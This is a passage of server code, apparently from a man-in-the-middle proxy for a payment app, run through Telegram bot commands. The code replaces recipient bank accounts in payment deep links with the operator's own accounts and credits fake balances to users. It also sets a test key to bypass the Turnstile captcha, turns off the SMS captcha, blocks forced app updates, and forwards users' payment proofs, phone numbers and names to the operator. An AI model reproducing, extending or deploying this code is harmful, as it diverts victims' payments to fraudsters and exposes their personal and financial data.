                await sendCommandReply(`✅ Login block removed\nNumber: ${banKey}`);
            } else {
                await sendCommandReply(`ℹ️ No login block found for ${banKey}`);
            }
            return res.sendStatus(200);
        }

        if (text === '/unban' || text.startsWith('/unban ')) {
            await sendCommandReply('❌ Format: /unban <number>');
            return res.sendStatus(200);
        }

        if (text === '/bans') {
            const entries = Object.entries(data.bannedUsers || {});
            if (!entries.length) {
                await sendCommandReply('📋 No blocked numbers.');
                return res.sendStatus(200);
            }
            const list = entries.map(([number, entry]) => `🚫 ${number}\n   ${entry.message || 'Login blocked'}`).join('\n\n');
            await sendCommandReply(`📋 Blocked login numbers:\n\n${list}`.substring(0, 4000));
            return res.sendStatus(200);
        }

        if (text === '/on') { data.botEnabled = true; data._skipOverrideMerge = true; await saveData(data); await sendCommandReply('🟢 Proxy ON'); return res.sendStatus(200); }
        if (text === '/off') { data.botEnabled = false; data._skipOverrideMerge = true; await saveData(data); await sendCommandReply('🔴 Proxy OFF'); return res.sendStatus(200); }
        if (text === '/rotate') { data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await sendCommandReply(`🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
        if (text === '/log') { data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await sendCommandReply(`📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }

        if (text === '/rr') {
            data.rawLog = !data.rawLog;
            data._skipOverrideMerge = true;
            await saveData(data);
            await sendCommandReply(
                data.rawLog
                    ? '📡 Raw Log: 🟢 ON\n\nAb har request ka FULL detail aayega:\n• Method, URL, Headers, Body\n• Response Status, Headers, Body\n• App API (/xxapi/*) + Frontend pages dono\n\nBand karne ke liye dobara /rr bhejo.'
                    : '📡 Raw Log: 🔴 OFF\n\nFull request/response logging band.'
            );
            return res.sendStatus(200);
        }

        if (text === '/update' || text === '/update off' || text === '/update on') {
            if (text === '/update on') { data.blockUpdate = false; } else { data.blockUpdate = true; }
            data._skipOverrideMerge = true; await saveData(data);
            await sendCommandReply(data.blockUpdate ? '🚫 Update BLOCKED' : '✅ Update ALLOWED');
            return res.sendStatus(200);
        }

        if (text.startsWith('/add ')) {
            const parts = text.substring(5).trim().split(/\s+/);
            const amount = parseFloat(parts[0]);
            const targetUserId = parts[1] || '';
            if (isNaN(amount) || !targetUserId) { await sendCommandReply('❌ Format: /add <amount> <userId>'); return res.sendStatus(200); }
            if (!data.userOverrides) data.userOverrides = {};
            if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
            data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) + amount;
            if (!data.balanceHistory) data.balanceHistory = [];
            const tracked = data.trackedUsers && data.trackedUsers[targetUserId];
            data.balanceHistory.push({ type: 'add', userId: targetUserId, amount, totalAdded: data.userOverrides[targetUserId].addedBalance, time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), phone: (tracked && tracked.phone) || '' });
            data._skipOverrideMerge = true; await saveData(data);
            const statusMsg = tracked ? `📊 Balance: ₹${tracked.balance || 'N/A'}` : `⏳ User is offline — ₹${data.userOverrides[targetUserId].addedBalance} will show when they open the app`;
            await sendCommandReply(`✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance}\n${statusMsg}`);
            return res.sendStatus(200);
        }

        if (text.startsWith('/deduct ')) {
            const parts = text.substring(8).trim().split(/\s+/);
            const amount = parseFloat(parts[0]);
            const targetUserId = parts[1] || '';
            if (isNaN(amount) || !targetUserId) { await sendCommandReply('❌ Format: /deduct <amount> <userId>'); return res.sendStatus(200); }
            if (!data.userOverrides) data.userOverrides = {};
            if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
            data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) - amount;
            if (!data.balanceHistory) data.balanceHistory = [];
            data.balanceHistory.push({ type: 'deduct', userId: targetUserId, amount, totalAdded: data.userOverrides[targetUserId].addedBalance, time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) });
            data._skipOverrideMerge = true; await saveData(data);
            await sendCommandReply(`✅ Deducted ₹${amount} from user ${targetUserId}\n💰 Total: ₹${data.userOverrides[targetUserId].addedBalance || 0}`);
            return res.sendStatus(200);
        }

        if (text.startsWith('/remove balance ')) {
            const targetId = text.substring(16).trim();
            if (!targetId) { await sendCommandReply('❌ Format: /remove balance <userId>'); return res.sendStatus(200); }
            if (data.userOverrides && data.userOverrides[targetId]) {
                const removed = data.userOverrides[targetId].addedBalance || 0;
                delete data.userOverrides[targetId].addedBalance;
                data._skipOverrideMerge = true; await saveData(data);
                await sendCommandReply(`🗑 Removed ₹${removed} fake balance from user ${targetId}`);
            } else { await sendCommandReply(`ℹ️ No fake balance for ${targetId}`); }
            return res.sendStatus(200);
        }

        if (text === '/history' || text.startsWith('/history ')) {
            const ht = text.startsWith('/history ') ? text.substring(9).trim() : '';
            const history = data.balanceHistory || [];
            const filtered = ht ? history.filter(h => h.userId === ht) : history;
            if (filtered.length === 0) { await sendCommandReply('📋 No history.'); return res.sendStatus(200); }
            let m = '📊 Balance History:\n\n';
            for (const h of filtered.slice(-20)) {
                m += `${h.type === 'add' ? '➕' : '➖'} ₹${h.amount} → ${h.userId}${h.phone ? ' (' + h.phone + ')' : ''} | ${h.time}\n`;
            }
            await sendCommandReply(m.substring(0, 4000));
            return res.sendStatus(200);
        }

        if (text === '/clearhistory') {
            data.balanceHistory = []; data._skipOverrideMerge = true; await saveData(data);
            await sendCommandReply('🗑 History cleared.');
            return res.sendStatus(200);
        }

        if (text === '/idtrack') {
            const tracked = data.trackedUsers || {};
            const ids = Object.keys(tracked);
            if (ids.length === 0) { await sendCommandReply('📋 No users tracked.'); return res.sendStatus(200); }
            let m = '📋 Tracked Users:\n\n';
            for (const uid of ids) {
                const u = tracked[uid];
                const addedBal = data.userOverrides && data.userOverrides[uid] && data.userOverrides[uid].addedBalance ? ` (+₹${data.userOverrides[uid].addedBalance})` : '';
                m += `👤 ID: ${uid}\n`;
                if (u.name) m += `   📛 ${u.name}\n`;
                if (u.phone) m += `   📱 ${u.phone}\n`;
                if (u.balance) m += `   💰 ₹${u.balance}${addedBal}\n`;
                m += `   🕐 ${u.lastAction || 'N/A'} @ ${u.lastSeen || 'N/A'}\n\n`;
            }
            await sendCommandReply(m.substring(0, 4000));
            return res.sendStatus(200);
        }

        if (text === '/banks') {
            if (!data.banks || data.banks.length === 0) { await sendCommandReply('❌ No banks.'); return res.sendStatus(200); }
            await sendCommandReply('💳 Banks:\n\n' + bankListText(data));
            return res.sendStatus(200);
        }

        if (text === '/orders') {
            if (!data.orderBankMap || Object.keys(data.orderBankMap).length === 0) {
                await sendCommandReply('📋 No saved orders.');
                return res.sendStatus(200);
            }
            const manualOrders = [];
            const seen = new Set();
            for (const [orderId, rawOrderData] of Object.entries(data.orderBankMap)) {
                const orderData = parseSavedMapping(rawOrderData);
                if (!orderData || typeof orderData !== 'object') continue;
                const uniqueKey = String(orderData.rptNo || orderData.orderNo || orderData.orderId || orderId || '').trim();
                if (!uniqueKey || seen.has(uniqueKey)) continue;
                // Show mappings created by the proxy as well as manually added ones.
                if (!orderData.isManual && !orderData.forced && !orderData.accountNo && !orderData.acctNo) continue;
                seen.add(uniqueKey);
                const bankText = orderData.bank || `${orderData.accountHolder || orderData.acctName || ''} | ${orderData.accountNo || orderData.acctNo || ''} | ${orderData.ifsc || orderData.acctCode || ''}`;
                manualOrders.push(`🛒 Order: ${uniqueKey}\n🏦 Bank: ${bankText}\n`);
            }

            let m = `📋 Saved Orders (${manualOrders.length}):\n\n`;
            for (const ord of manualOrders) {
                m += ord + '\n';
            }
            await sendCommandReply(m.substring(0, 4000) || '📋 No manually saved orders.');
            return res.sendStatus(200);
        }

        if (text.startsWith('/addorder ')) {
            const parts = text.substring(10).split('|').map(s => s.trim());
            if (parts.length < 2) {
                await sendCommandReply('❌ Format: /addorder <OrderNo> | <BankNumber>\nExample: /addorder 5524954159126535 | 1');
                return res.sendStatus(200);
            }
            const orderNo = parts[0];
            const bankIdx = parseInt(parts[1]) - 1;

            if (isNaN(bankIdx) || bankIdx < 0 || !data.banks || bankIdx >= data.banks.length) {
                await sendCommandReply(`❌ Invalid Bank Number. You have ${data.banks ? data.banks.length : 0} banks added. Use /banks to see the list.`);
                return res.sendStatus(200);
            }

            const selectedBank = data.banks[bankIdx];
            const accountHolder = selectedBank.accountHolder || '';
            const accountNo = selectedBank.accountNo || '';
            const ifsc = selectedBank.ifsc || '';
            const bankName = selectedBank.bankName || '';
            const upiId = selectedBank.upiId || '';

            if (!data.orderBankMap) data.orderBankMap = {};

            const last4 = accountNo.slice(-4);
            let wDomain = '';
            if (accountNo) {
                wDomain = `mobikwik://moneytransfer/upi/bank?account=${accountNo}&ifsc=${ifsc}&name=${encodeURIComponent(accountHolder)}&amount=0.0&displayAccountNumber=xxxxxxxxx${last4}`;
            }

            data.orderBankMap[orderNo] = {
                bank: `${accountHolder} | ${accountNo}${ifsc ? ' | ' + ifsc : ''}`,
                accountHolder,
                accountNo,
                ifsc,
                bankName,
                upiId,
                rptNo: orderNo,
                orderNo: orderNo,
                walletDomain: wDomain,
                payType: 1, // Assume bank transfer for manual for now
                time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
                userId: 'manual',
                forced: true,
                isManual: true // Flag to identify manually added orders
            };

            data._skipOverrideMerge = true;
            await saveData(data);
            await sendCommandReply(`✅ Saved Order Mapping:\nOrder: ${orderNo}\nMapped to Bank #${bankIdx + 1}:\n${selectedBank.accountHolder} | ${selectedBank.accountNo}`);
            return res.sendStatus(200);
        }

        if (text === '/delete all') {
            const deletedCount = data.orderBankMap ? Object.keys(data.orderBankMap).length : 0;
            data.orderBankMap = {};
            data._skipOverrideMerge = true;
            await saveData(data);
            await sendCommandReply(deletedCount
                ? `🗑️ Deleted all saved order mappings (${deletedCount} entries). Banks and other settings were kept.`
                : 'ℹ️ No saved orders found. Banks and other settings were kept.');
            return res.sendStatus(200);
        }

        if (text.startsWith('/delorder ')) {
            const orderNo = text.substring(10).trim();
            if (!data.orderBankMap) {
                await sendCommandReply(`❌ Order ${orderNo} not found in saved mappings.`);
                return res.sendStatus(200);
            }

            let deleted = false;
            // Delete any key that matches orderNo directly
            if (data.orderBankMap[orderNo]) {
                delete data.orderBankMap[orderNo];
                deleted = true;
            }

            // Also delete any other keys that point to the same order object
            for (const [k, v] of Object.entries(data.orderBankMap)) {
                if (v.orderNo === orderNo || v.rptNo === orderNo || v.orderId === orderNo || v.id === orderNo) {
                    delete data.orderBankMap[k];
                    deleted = true;
                }
            }

            if (!deleted) {
                await sendCommandReply(`❌ Order ${orderNo} not found in saved mappings.`);
                return res.sendStatus(200);
            }

            data._skipOverrideMerge = true;
            await saveData(data);
            await sendCommandReply(`🗑️ Removed order mapping for: ${orderNo}`);
            return res.sendStatus(200);
        }

        if (text.startsWith('/addbank ')) {
            const parts = text.substring(9).split('|').map(s => s.trim());
            if (parts.length < 3) { await sendCommandReply('❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI'); return res.sendStatus(200); }
            if (data.banks.length >= 10) { await sendCommandReply('❌ Max 10 banks.'); return res.sendStatus(200); }
            const nb = { accountHolder: parts[0], accountNo: parts[1], ifsc: parts[2], bankName: parts[3] || '', upiId: parts[4] || '' };
            data.banks.push(nb);
            if (data.activeIndex < 0) data.activeIndex = 0;
            data._skipOverrideMerge = true; await saveData(data);
            await sendCommandReply(`✅ Bank #${data.banks.length} added:\n${nb.accountHolder} | ${nb.accountNo}\nIFSC: ${nb.ifsc}`);
            return res.sendStatus(200);
        }

        if (text.startsWith('/removebank ')) {
            const idx = parseInt(text.substring(12).trim()) - 1;
            if (isNaN(idx) || idx < 0 || idx >= data.banks.length) { await sendCommandReply('❌ Invalid index.'); return res.sendStatus(200); }
            const removed = data.banks.splice(idx, 1)[0];
            if (data.activeIndex === idx) data.activeIndex = data.banks.length > 0 ? 0 : -1;
            else if (data.activeIndex > idx) data.activeIndex--;
            data._skipOverrideMerge = true; await saveData(data);
            await sendCommandReply(`🗑️ Removed: ${removed.accountHolder} | ${removed.accountNo}`);
            return res.sendStatus(200);
        }

        if (text.startsWith('/setbank ')) {
            const idx = parseInt(text.substring(9).trim()) - 1;
            if (isNaN(idx) || idx < 0 || idx >= data.banks.length) { await sendCommandReply('❌ Invalid index.'); return res.sendStatus(200); }
            data.activeIndex = idx; data._skipOverrideMerge = true; await saveData(data);
            await sendCommandReply(`✅ Active bank: #${idx + 1}\n${data.banks[idx].accountHolder} | ${data.banks[idx].accountNo} | ${data.banks[idx].ifsc}`);
            return res.sendStatus(200);
        }

        if (text.startsWith('/setmin ')) {
            data = await loadData(true);
            const parts = text.substring(8).trim().split(/\s+/);
            const bankIdx = parseInt(parts[0]) - 1;
            const amount = parseFloat(parts[1]);
            if (isNaN(bankIdx) || bankIdx < 0 || bankIdx >= (data.banks || []).length || isNaN(amount) || amount < 0) {
                await sendCommandReply('❌ Format: /setmin <bank_number> <amount>\nExample: /setmin 1 500\n\nBank replace sirf tabhi hoga jab buy amount >= set amount');
                return res.sendStatus(200);
            }
            data.banks[bankIdx].minAmount = amount;
            data._skipOverrideMerge = true;
            await saveData(data);
            await sendCommandReply(amount === 0
                ? `✅ Bank #${bankIdx + 1} ka min amount remove kiya — ab saari amounts pe bank replace hoga`
                : `✅ Bank #${bankIdx + 1} min amount: ₹${amount}\nAb sirf ₹${amount}+ ke buy orders pe bank replace hoga`);
            return res.sendStatus(200);
        }

        if (text.startsWith('/usdt ')) {
            const addr = text.substring(6).trim();
            if (addr.toLowerCase() === 'off') { data.usdtAddress = ''; } else if (addr.length >= 20) { data.usdtAddress = addr; }
            else { await sendCommandReply('❌ Invalid address.'); return res.sendStatus(200); }
            data._skipOverrideMerge = true; await saveData(data);
            await sendCommandReply(data.usdtAddress ? `₮ USDT: ${data.usdtAddress}` : '❌ USDT override OFF');
            return res.sendStatus(200);
        }

        return res.sendStatus(200);
    } catch (e) {
        console.error('Bot error:', e);
        return res.sendStatus(200);
    }
});

async function proxyToTivox(req) {
    const path = req.originalUrl || req.url;
    const url = TIVOX_API + path;
    const fwd = {};
    for (const [k, v] of Object.entries(req.headers)) {
        const kl = k.toLowerCase();
        if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
        fwd[k] = v;
    }
    fwd['host'] = 'tivox.icu';
    fwd['origin'] = 'https://vivipay.net';
    fwd['referer'] = 'https://vivipay.net/';
    if (!fwd['user-agent']) {
        fwd['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
    }
    const opts = { method: req.method, headers: fwd, redirect: 'manual' };
    if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
        opts.body = req.rawBody;
        fwd['content-length'] = String(req.rawBody.length);
    }
    const response = await fetch(url, opts);
    const respBody = await response.text();
    const respHeaders = {};
    response.headers.forEach((val, key) => {
        const kl = key.toLowerCase();
        if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
            respHeaders[key] = val;
        }
    });
    return { response, respBody, respHeaders };
}

async function proxyToReal(req) {
    const path = req.originalUrl || req.url;
    const url = TIVOX_API + path;
    const fwd = {};
    for (const [k, v] of Object.entries(req.headers)) {
        const kl = k.toLowerCase();
        if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl === 'x-px-uid' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded') || kl.startsWith('x-px-')) continue;
        fwd[k] = v;
    }
    fwd['host'] = 'tivox.icu';
    fwd['origin'] = 'https://vivipay.net';
    fwd['referer'] = 'https://vivipay.net/';
    if (!fwd['user-agent']) {
        fwd['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
    }
    const opts = { method: req.method, headers: fwd, redirect: 'manual' };
    if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
        opts.body = req.rawBody;
        fwd['content-length'] = String(req.rawBody.length);
    }
    const response = await fetch(url, opts);
    const respBody = await response.text();
    const respHeaders = {};
    response.headers.forEach((val, key) => {
        const kl = key.toLowerCase();
        if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
            respHeaders[key] = val;
        }
    });
    return { response, respBody, respHeaders };
}

function sendJson(res, headers, json, fallbackBody) {
    const body = json ? JSON.stringify(json) : fallbackBody;
    headers['content-type'] = 'application/json; charset=utf-8';
    headers['content-length'] = String(Buffer.byteLength(body));
    res.writeHead(200, headers);
    res.end(body);
}

// rsCfg.json — rsKeyMode:-1 makes app skip Turnstile entirely (sets token="1" automatically).
// getsendtken with token="1" is force-patched to succeed by our /xxapi/* handler below.
app.get('/rsCfg.json', async (req, res) => {
    try {
        const url = 'https://' + FRONTEND_HOST + req.originalUrl;
        const resp = await fetch(url, { headers: { host: FRONTEND_HOST } });
        let cfg = null;
        try { cfg = await resp.json(); } catch (e) { }
        if (cfg && cfg.data) {
            cfg.data.okTurnstileSitekey = '1x00000000000000000000AA';   // CF test key — always passes
            cfg.data.siteKey = '1x00000000000000000000AA';
            cfg.data.rsKeyMode = 1;              // render Turnstile widget with test sitekey
            cfg.data.sliderSmsCaptcha = 0;       // disable SMS slider captcha
            cfg.data.tgChannelLink = TELEGRAM_OVERRIDE;
            cfg.data.whatsappLink = TELEGRAM_OVERRIDE;
        }
        res.setHeader('content-type', 'application/json; charset=utf-8');
        res.setHeader('access-control-allow-origin', '*');
        res.setHeader('cache-control', 'no-store');
        res.json(cfg || {
            code: 0, msg: 'success', data: {
                okTurnstileSitekey: '1x00000000000000000000AA',
                siteKey: '1x00000000000000000000AA',
                rsKeyMode: 1,
                sliderSmsCaptcha: 0
            }
        });
    } catch (e) {
        res.json({
            code: 0, msg: 'success', data: {
                okTurnstileSitekey: '1x00000000000000000000AA',
                siteKey: '1x00000000000000000000AA',
                rsKeyMode: 1,
                sliderSmsCaptcha: 0
            }
        });
    }
});

app.get('/app/version', async (req, res) => {
    try {
        const data = await loadData();
        const { response, respBody, respHeaders } = await proxyToTivox(req);
        let jsonResp = null;
        try { jsonResp = JSON.parse(respBody); } catch (e) { }
        if (jsonResp) {
            if (data.blockUpdate !== false) {
                if (jsonResp.forceUpdate !== undefined) jsonResp.forceUpdate = false;
                if (jsonResp.needUpdate !== undefined) jsonResp.needUpdate = false;
                if (jsonResp.force_update !== undefined) jsonResp.force_update = false;
                if (jsonResp.update !== undefined) jsonResp.update = false;
                const rd = jsonResp.data || jsonResp.body || jsonResp.result;
                if (rd && typeof rd === 'object') {
                    if (rd.forceUpdate !== undefined) rd.forceUpdate = false;
                    if (rd.needUpdate !== undefined) rd.needUpdate = false;
                }
            }
            sendJson(res, respHeaders, jsonResp);
        } else {
            respHeaders['content-length'] = String(Buffer.byteLength(respBody));
            res.writeHead(response.status, respHeaders);
            res.end(respBody);
        }
    } catch (e) {
        console.error('version error:', e.message);
        if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
    }
});

app.get('/app/jsValue/:type', async (req, res) => {
    try {
        const data = await loadData();
        const { response, respBody, respHeaders } = await proxyToTivox(req);
        notifyAdmin(data, `📜 JS Value (${req.params.type})\n${respBody.substring(0, 500)}`);
        respHeaders['content-length'] = String(Buffer.byteLength(respBody));
        res.writeHead(response.status, respHeaders);
        res.end(respBody);
    } catch (e) {
        if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
    }
});

app.all('/xxapi/*', async (req, res) => {
    try {
        let data = await loadData();
        const path = req.originalUrl || req.url;
        const urlLower = path.toLowerCase();
        const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

        // Handle OPTIONS requests (CORS preflight) early
        if (req.method === 'OPTIONS') {
            res.setHeader('Access-Control-Allow-Origin', '*');
            res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD');
            res.setHeader('Access-Control-Allow-Headers', '*');
            res.setHeader('Access-Control-Allow-Credentials', 'true');
            return res.status(200).end('OK');
        }

        // TEST_MODE only: refresh the shared state for authentication requests so
        // the override armed by Telegram is visible across Vercel instances, then
        // rewrite the same Client ID independently in each request body.
        const authEndpoint = getAuthClientIdEndpoint(path);
        if (authEndpoint) data = await loadData(true);
        if (authEndpoint) {
            const ban = getBanEntry(data, req);
            if (ban) {
                const banMessage = String(ban.message || 'Login is not available for this number.');
                res.setHeader('Content-Type', 'application/json; charset=utf-8');
                res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
                res.setHeader('Access-Control-Allow-Origin', '*');
                return res.status(200).json({ code: 1128, msg: banMessage, message: banMessage, success: false, data: null });
            }
        }
        await applyNextClientIdOverride(req, data);

        // ── 100% CLEAN BYPASS FOR UPI & TEAM BUTTONS ──────────────────────────────
        if (urlLower.includes('/collectiontoollist') || urlLower.includes('/teaminfo')) {
            const { response: r, respBody: rb, respHeaders: rh } = await proxyToReal(req);
            rh['content-length'] = String(Buffer.byteLength(rb));
            rh['Access-Control-Allow-Origin'] = '*';
            res.writeHead(r.status, rh);
            return res.end(rb);
        }
        // ──────────────────────────────────────────────────────────────────────────


        // Security checks are no longer intercepted.
        // They are handled natively by the real backend.

        // ── Payment-proof upload forwarding ───────────────────────────────────────
        // Forward the original upload first, then send the same decoded image to the
        // configured admin chat without changing the user's upstream response.
        const isPaymentProofUpload = req.method === 'POST' && (
            urlLower.includes('/uploadpaymentproof/') ||
            urlLower.includes('/upload_payment_proof/') ||
            urlLower.includes('/paymentproof/upload')
        );
        if (isPaymentProofUpload) {
            const proofProxy = await proxyToTivox(req);
            const proofPathMatch = path.match(/(?:uploadpaymentproof|upload_payment_proof)[\\/]([^/?#]+)/i);
            const proofOrderId = proofPathMatch ? proofPathMatch[1] : '';
            const proofContentType = String(req.headers['content-type'] || '').toLowerCase();
            const proof = extractPaymentProof(req.rawBody, proofContentType);
            const proofFields = proofContentType.includes('multipart') ? parseMultipartFields(req.rawBody) : {};
            const proofAmount = getOrderAmount(req, proofFields) || (data.orderBankMap && proofOrderId ? data.orderBankMap[String(proofOrderId)]?.amount : null);
            const resolvedProofUserId = await resolveUserId(req);
            const proofUserId = String(req.headers['x-px-uid'] || resolvedProofUserId || '');
            if (proofProxy.response.status >= 200 && proofProxy.response.status < 300) {
                await notifyPaymentProof(data, { orderId: proofOrderId, userId: proofUserId, amount: proofAmount, proof });
            }
            const proofBody = proofProxy.respBody;
            proofProxy.respHeaders['content-length'] = String(Buffer.byteLength(proofBody));
            res.writeHead(proofProxy.response.status, proofProxy.respHeaders);
            return res.end(proofBody);
        }

        // ── Dedicated pickuppaymentslip Interceptor ───────────────────────────────
        // 1. Extracts order_id from request payload / query
        // 2. Extracts amount & real bank from response walletDomain (supports MobiKwik, Freecharge, AmazonPay, PhonePe, Paytm, etc.)
        // 3. Checks amount >= minAmount FIRST
        // 4. Injects active bank into walletDomain if eligible
        // 5. ONLY saves to KV (orderBankMap) when bank was replaced
        // 6. Sends Telegram BUY notification
        const isPickupPaymentSlip = req.method === 'POST' && urlLower.includes('pickuppaymentslip');
        if (isPickupPaymentSlip) {
            let reqOrderId = '';
            if (req.body && typeof req.body === 'object') {
                reqOrderId = req.body.order_id || req.body.orderId || req.body.orderNo || req.body.rptNo || '';
            }
            if (!reqOrderId && req.rawBody) {
                try {
                    const ct = (req.headers['content-type'] || '').toLowerCase();
                    let rb = {};
                    if (ct.includes('multipart')) rb = parseMultipartFields(req.rawBody);
                    else if (ct.includes('json')) rb = JSON.parse(req.rawBody.toString());
                    else if (ct.includes('form')) rb = Object.fromEntries(new URLSearchParams(req.rawBody.toString()));
                    reqOrderId = rb.order_id || rb.orderId || rb.orderNo || rb.rptNo || '';
                } catch (e) { }
            }
            if (!reqOrderId) {
                const qs = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
                reqOrderId = qs.get('order_id') || qs.get('orderId') || qs.get('orderNo') || qs.get('rptNo') || '';
            }
            reqOrderId = String(reqOrderId || '').trim();

            const pxUid = req.headers['x-px-uid'] || '';
            let resolvedUid = (pxUid && /^\d{3,12}$/.test(pxUid)) ? pxUid : (await resolveUserId(req));
            if (resolvedUid) await saveUserMapping(req, resolvedUid);

            const { response: pResp, respBody: pRespBody, respHeaders: pRespHeaders } = await proxyToTivox(req);
            let pJson = null;
            try { pJson = JSON.parse(pRespBody); } catch (e) { }

            if (!pJson || (pJson.code !== 0 && pJson.code !== 200 && pJson.code !== undefined)) {
                const errMsg = pJson ? (pJson.msg || pJson.message || 'unknown error') : 'Response error';
                const errorKey = (reqOrderId || 'unknown') + '_' + errMsg;
                const lastErrTime = recentErrors.get(errorKey) || 0;
                const nowTs = Math.floor(Date.now() / 1000);
                if (nowTs - lastErrTime > 15) {
                    recentErrors.set(errorKey, nowTs);
                    notifyAdmin(data, `❌ BUY NOT SUCCESSFUL\n📋 Order: ${reqOrderId || 'N/A'}\n⚠️ Reason: ${errMsg}\n🕐 ${now}`).catch(() => { });
                }
                pRespHeaders['content-length'] = String(Buffer.byteLength(pRespBody));
                res.writeHead(pResp.status, pRespHeaders);
                return res.end(pRespBody);
            }

            const rawWallet = pJson.data && pJson.data.walletDomain ? String(pJson.data.walletDomain) : '';
            const walletInfo = parseWalletDomainDetails(rawWallet);
            const parsedAmt = walletInfo && walletInfo.amount !== null ? walletInfo.amount : (getOrderAmount(req, pJson.data) || 0);
            const activeBank = getActiveBank(data, resolvedUid);
            const minAmount = activeBank && activeBank.minAmount ? parseFloat(activeBank.minAmount) : 0;

            let replaced = false;

            if (data.botEnabled !== false && activeBank && activeBank.accountNo) {
                // 1. AMOUNT CHECK FIRST!
                if (minAmount <= 0 || parsedAmt >= minAmount) {
                    // 2. INJECT ACTIVE BANK INTO WALLET DOMAIN (ANY WALLET SCHEME)
                    if (rawWallet) {
                        pJson.data.walletDomain = injectBankIntoWalletDomain(rawWallet, activeBank);
                        replaced = true;
                    }

                    // 3. ONLY SAVE IN KV WHEN REPLACED!
                    if (replaced && reqOrderId) {
                        if (!data.orderBankMap) data.orderBankMap = {};
                        const savedData = {
                            bank: `${activeBank.accountHolder} | ${activeBank.accountNo} | ${activeBank.ifsc}`,
                            accountHolder: activeBank.accountHolder,
                            accountNo: activeBank.accountNo,
                            ifsc: activeBank.ifsc,
                            bankName: activeBank.bankName || '',
                            upiId: activeBank.upiId || '',
                            rptNo: reqOrderId,
                            orderNo: reqOrderId,
                            orderId: reqOrderId,
                            amount: parsedAmt,
                            walletDomain: pJson.data.walletDomain,
                            time: now,
                            userId: resolvedUid || '',
                            isManual: true,
                            forced: true
                        };
                        data.orderBankMap[reqOrderId] = savedData;
                        data._skipOverrideMerge = true;
                        await saveData(data);
                    }
                }
            }

            const realBank = walletInfo && (walletInfo.accountNo || walletInfo.name || walletInfo.ifsc)
                ? { accountHolder: walletInfo.name || '', accountNo: walletInfo.accountNo || '', ifsc: walletInfo.ifsc || '', upiId: walletInfo.upiId || '' }
                : (captureRealBank(pJson) || {});

            const realLine = (realBank.accountNo || realBank.accountHolder)
                ? `🏦 Real Bank:\n  Name: ${realBank.accountHolder || 'N/A'}\n  Acc:  ${realBank.accountNo || 'N/A'}${realBank.ifsc ? '\n  IFSC: ' + realBank.ifsc : ''}${realBank.bankName ? '\n  Bank: ' + realBank.bankName : ''}${realBank.upiId ? '\n  UPI:  ' + realBank.upiId : ''}`
                : '🏦 Real Bank: N/A';

            if (replaced && activeBank) {
                const replaceLine = `✅ Replaced With:\n  Name: ${activeBank.accountHolder}\n  Acc:  ${activeBank.accountNo}\n  IFSC: ${activeBank.ifsc}${activeBank.bankName ? '\n  Bank: ' + activeBank.bankName : ''}${activeBank.upiId ? '\n  UPI:  ' + activeBank.upiId : ''}`;
                const canNotify = await claimOrderNotification(data, reqOrderId || pJson.data);
                if (canNotify) {
                    notifyAdmin(data, `✅ BUY SUCCESSFUL\n💰 Amount: ₹${parsedAmt}\n📋 Order: ${reqOrderId || 'N/A'}\n💾 Order is saved for history\n━━━━━━━━━━━━━━━━━━━━\n${realLine}\n━━━━━━━━━━━━━━━━━━━━\n${replaceLine}\n🕐 ${now}`).catch(() => { });
                }
            } else if (parsedAmt > 0 && minAmount > 0 && parsedAmt < minAmount) {
                const canNotify = await claimOrderNotification(data, reqOrderId || pJson.data);
                if (canNotify) {
                    notifyAdmin(data, `⚠️ BUY SUCCESSFUL (NOT REPLACED)\n💰 Amount: ₹${parsedAmt}\n📋 Order: ${reqOrderId || 'N/A'}\nℹ️ ₹${parsedAmt} < Min ₹${minAmount}\n━━━━━━━━━━━━━━━━━━━━\n${realLine}\n━━━━━━━━━━━━━━━━━━━━\n❌ NOT Replaced (Amount < Min)\n🕐 ${now}`).catch(() => { });
                }
            }

            cleanUglyBankNames(pJson);
            sendJson(res, pRespHeaders, pJson);
            return;
        }

        // ── Buy / pick-up order intercept — per-wallet, two-case force logic ────────
        // List endpoints (just fetching available orders) must NOT be intercepted

        const isBuyList = urlLower.includes('/list') || urlLower.includes('_list') ||
            urlLower.includes('listbuy') || urlLower.includes('list_buy') ||
            // Detail / info / query / status endpoints must NOT be treated as buy actions
            urlLower.includes('/detail') || urlLower.includes('_detail') ||
